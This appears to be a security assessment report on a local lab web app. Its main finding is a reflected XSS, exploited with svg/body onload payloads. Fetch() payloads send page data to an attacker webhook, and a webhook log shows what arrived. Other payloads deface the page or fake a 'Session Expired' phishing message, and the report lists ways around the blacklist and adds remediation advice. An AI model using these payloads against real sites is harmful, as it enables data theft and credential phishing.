# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:41185
- **Assessment Date:** January 24, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements zero authentication mechanisms - there are no login endpoints, session management, or user verification systems of any kind.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application has no authorization controls, role-based access control, or permission systems. All functionality is equally accessible to all users without restriction.

**Cross-Site Scripting (XSS) Vulnerabilities:**
**CRITICAL** - One reflected XSS vulnerability was successfully exploited in the `/page` endpoint via the `name` query parameter. The vulnerability allows arbitrary JavaScript execution through a trivially bypassable blacklist filter that blocks only 6 specific strings. Exploitation requires no authentication and enables complete DOM manipulation, data exfiltration, phishing attacks, and session compromise. The application actively disables browser XSS protections by setting `X-XSS-Protection: 0` and has no Content Security Policy.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database (eliminating SQL injection), and while it uses subprocess execution for PhantomJS, it safely uses array-based arguments with no user-controlled command parameters.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. While the application uses PhantomJS for server-side rendering, all URLs are constructed server-side with hardcoded protocol (`http://`), host (`localhost`), and port (`5000`) values. Users can only control HTML file content, not request destinations.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp (HTTP):** Caddy httpd reverse proxy handling HTTP traffic
- **Port 443/tcp (HTTPS):** Caddy SSL/HTTPS service
- **Port 41185/tcp:** Docker-mapped port exposing internal Flask application (port 5000)
- **Port 49158/tcp:** Golang net/http server (Tailscale) requiring authentication - returns 401 Unauthorized

**Security-Relevant Findings:**

*Technology Stack Vulnerabilities:*
- Application runs on **Python 2.7.18** (EOL since January 1, 2020) - no security patches for 5+ years
- **Flask 1.1.4** - multiple major versions behind current release (3.x)
- **Werkzeug 1.0.1** development server exposed to network
- **PhantomJS** headless browser (archived 2018, multiple unpatched WebKit vulnerabilities)
- Base container uses **Debian Buster archived repository** - no longer receiving security updates

*Security Configuration Issues:*
- OpenSSL configuration disabled (`ENV OPENSSL_CONF=/dev/null`) preventing proper TLS/SSL validation
- Debug mode enabled (`app.run(debug=True)`) exposing Werkzeug debugger with stack traces
- Container likely running as root (no USER directive specified)

*Missing Security Headers:*
- No Content-Security-Policy (CSP)
- No Strict-Transport-Security (HSTS)
- No X-Frame-Options
- X-XSS-Protection explicitly disabled (set to "0")

*Exposed Services:*
- Flask development server accessible directly (should use production WSGI server)
- Static file directory serves dynamically-created temporary files with flags
- Health check uses bash TCP connection test exposing internal architecture

*Secrets Management Issues:*
- Flag stored in plaintext in `secret.txt` (world-readable 644 permissions)
- Secrets embedded in Docker image layers via build arguments
- `.env` file with hardcoded secrets committed to version control

**Subdomain Discovery:**
All discovered subdomains appear to be false positives from subfinder scanning localhost. No actual subdomains exist for this single-host Docker containerized application.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in /page Endpoint via name Parameter

**Summary:**
- **Vulnerable location:** `http://localhost:41185/page?name=<payload>`
- **Overview:** The application accepts user input via the `name` query parameter and reflects it directly into an HTML attribute context without proper output encoding. A weak blacklist filter (blocking only 6 specific strings) can be easily bypassed using alternative event handlers and encoding techniques.
- **Impact:** Complete control over victim's browser session, enabling arbitrary JavaScript execution, DOM manipulation, data exfiltration, and phishing attacks. Any user who clicks a malicious link will have their session compromised.
- **Severity:** Critical

**Prerequisites:**
- Target URL: `http://localhost:41185`
- No authentication required
- Victim must click on a malicious URL (can be sent via phishing email, social media, QR code, etc.)
- Attacker-controlled webhook server for data exfiltration (demonstrated using `http://localhost:9999`)

**Exploitation Steps:**

1. **Confirm JavaScript Execution with Basic Payload**

   Navigate to the following URL to trigger a JavaScript alert dialog:
   ```
   http://localhost:41185/page?name=<svg/onload=alert(1)>
   ```

   **Expected Result:** Browser displays an alert dialog with the message "1", confirming arbitrary JavaScript execution.

   **Blacklist Bypass:** The payload uses `<svg/onload=...>` instead of blocked terms like `<script>` or `onerror`. The `onload` event handler is not in the blacklist.

2. **Exfiltrate Document Domain**

   Navigate to:
   ```
   http://localhost:41185/page?name=<svg/onload=fetch(`http://localhost:9999/exfil?data=${document.domain}`)>
   ```

   **Expected Result:** The attacker's webhook at `http://localhost:9999` receives a GET request to `/exfil?data=localhost`, confirming data exfiltration capability.

   **Blacklist Bypass:** Uses backticks instead of single quotes (which are blocked) and no spaces in the JavaScript code.

3. **Exfiltrate Page HTML Content**

   Navigate to:
   ```
   http://localhost:41185/page?name=<svg/onload=fetch(`http://localhost:9999/exfil?html=${encodeURIComponent(document.body.innerHTML.substring(0,100))}`)>
   ```

   **Expected Result:** Attacker's webhook receives the first 100 characters of the page's HTML content, demonstrating the ability to steal sensitive page data.

4. **Demonstrate Outbound Network Requests**

   Navigate to:
   ```
   http://localhost:41185/page?name=<body/onload=fetch(`http://localhost:9999/test2`)>
   ```

   **Expected Result:** Attacker's webhook receives a GET request to `/test2`, confirming the ability to make arbitrary network requests from the victim's browser.

   **Blacklist Bypass:** Uses `<body/onload=...>` event handler which is not blocked by the blacklist.

5. **DOM Manipulation - Replace Page Content**

   Navigate to:
   ```
   http://localhost:41185/page?name=<body/onload=document.body.innerHTML=`<h1>ACCOUNT%09COMPROMISED</h1><p>XSS%09Attack%09Successful</p>`;fetch(`http://localhost:9999/success?page=${document.title}`)>
   ```

   **Expected Result:** The entire page content is replaced with "ACCOUNT COMPROMISED" and "XSS Attack Successful", demonstrating complete control over the victim's visual experience.

   **Blacklist Bypass:** Uses `%09` (tab character) instead of spaces to bypass the space filter.

6. **Phishing Attack - Inject Fake "Session Expired" Message**

   Navigate to:
   ```
   http://localhost:41185/page?name=<svg/onload=eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,105,110,110,101,114,72,84,77,76,61,34,60,104,49,62,83,101,115,115,105,111,110,32,69,120,112,105,114,101,100,60,47,104,49,62,60,112,62,80,108,101,97,115,101,32,108,111,103,32,105,110,32,97,103,97,105,110,60,47,112,62,34))>
   ```

   **Decoded Payload:** The `String.fromCharCode()` decodes to:
   ```javascript
   document.body.innerHTML="<h1>Session Expired</h1><p>Please log in again</p>"
   ```

   **Expected Result:** Page displays a convincing "Session Expired" message, demonstrating the potential for credential phishing attacks by injecting fake login forms.

   **Blacklist Bypass:** Uses `eval()` with `String.fromCharCode()` encoding to completely obfuscate the payload and bypass all blacklist filters including spaces.

**Proof of Impact:**

**1. JavaScript Execution Confirmed:**
- Alert dialog successfully triggered with payload `<svg/onload=alert(1)>`
- Browser displayed "Oops! You did an alert with 1 instead of 'XSS'" message, confirming the application detected but could not prevent execution

**2. Data Exfiltration to Attacker-Controlled Server:**

The following data was successfully exfiltrated to `http://localhost:9999`:

- **Document Domain:** `localhost` (received at `/exfil?data=localhost`)
- **Page HTML Content:** `<article class=\"widget widget__login\">\n        <div class=\"widget__content\">\n            <div class=` (first 100 characters received at `/exfil?html=...`)
- **Page Title:** Confirmed via successful fetch to `/test2`

**Webhook Evidence:**
```
================================================================================
[2025-10-24T21:41:09.795Z] Incoming GET request
================================================================================
Full URL: /exfil?data=localhost
Path: /exfil
Query Parameters: {
  "data": "localhost"
}
Headers: {
  "origin": "http://localhost:41185",
  "referer": "http://localhost:41185/"
}
================================================================================

================================================================================
[2025-10-24T21:41:25.854Z] Incoming GET request
================================================================================
Full URL: /exfil?html=%3Carticle%20class%3D%22widget%20widget__login%22%3E%0A...
Path: /exfil
Query Parameters: {
  "html": "<article class=\"widget widget__login\">\n        <div class=\"widget__content\">\n            <div class="
}
Headers: {
  "origin": "http://localhost:41185",
  "referer": "http://localhost:41185/"
}
================================================================================

================================================================================
[2025-10-24T21:42:27.270Z] Incoming GET request
================================================================================
Full URL: /test2
Path: /test2
Query Parameters: {}
Headers: {
  "origin": "http://localhost:41185",
  "referer": "http://localhost:41185/"
}
================================================================================
```

**3. Complete DOM Manipulation:**

Successfully replaced entire page content with attacker-controlled HTML:
- Injected heading: "ACCOUNT COMPROMISED"
- Injected paragraph: "XSS Attack Successful"
- Visual proof captured in screenshot showing the manipulated page

**4. Phishing Demonstration:**

Successfully injected convincing phishing message:
- Displayed "Session Expired" heading
- Displayed "Please log in again" message
- Page completely replaced to show only attacker-controlled content
- Visual proof captured in screenshot

**Notes:**

**Blacklist Analysis:**
The application blocks only these 6 strings (case-insensitive):
1. `'script'` - bypassed by using event handlers instead of `<script>` tags
2. `'onerror'` - bypassed by using alternative handlers (`onload`, `onanimationstart`, etc.)
3. `'onclick'` - bypassed by using `onload`, `onmousemove`, etc.
4. `'onmouseover'` - bypassed by using other mouse event handlers
5. `"'"` (single quote) - bypassed by using backticks or double quotes
6. `" "` (space) - bypassed by using tabs (`%09`), newlines, or encoding techniques

**Multiple Working Bypass Techniques:**
- Alternative event handlers: `onload`, `onanimationstart`, `onfocus`
- Alternative HTML tags: `<svg>`, `<body>`, `<img>`, `<iframe>`
- String encoding: `String.fromCharCode()`, `eval()`, `atob()` (base64)
- Space replacement: tabs (`%09`), no spaces in compact JavaScript
- Quote alternatives: backticks for template literals

**Environment Details:**
- No Content Security Policy (CSP) header present
- X-XSS-Protection explicitly set to "0" (disabled)
- No authentication required to access vulnerable endpoint
- HTTP-only (no HTTPS), making man-in-the-middle attacks easier
- No session cookies exist (application has no session management)

**Real-World Attack Scenarios:**

1. **Phishing via Social Engineering:**
   - Attacker sends email: "Check your account status: http://localhost:41185/page?name=<payload>"
   - Victim clicks link and sees fake "Session Expired" message
   - Attacker injects fake login form to steal credentials

2. **Data Exfiltration:**
   - Attacker crafts payload that reads sensitive page data
   - Data automatically sent to attacker's server when victim visits malicious link
   - No user interaction required beyond clicking the link

3. **Persistent Monitoring:**
   - Attacker injects JavaScript that monitors user input
   - Keystrokes or form submissions exfiltrated in real-time
   - Victim completely unaware of compromise

4. **Defacement:**
   - Attacker replaces page content with malicious or embarrassing content
   - Could be used to damage organization's reputation
   - Screenshots can be captured and shared as "proof" of compromise

**Remediation Required:**
1. Implement context-aware output encoding (HTML entity encoding for HTML contexts)
2. Replace blacklist with whitelist validation (allow only alphanumeric characters)
3. Add Content-Security-Policy header to prevent inline script execution
4. Enable X-XSS-Protection or use modern browsers' built-in protections
5. Implement HTTPOnly and Secure flags if session cookies are added in future
6. Consider using a web application firewall (WAF) as defense-in-depth

---

**End of Security Assessment Report**
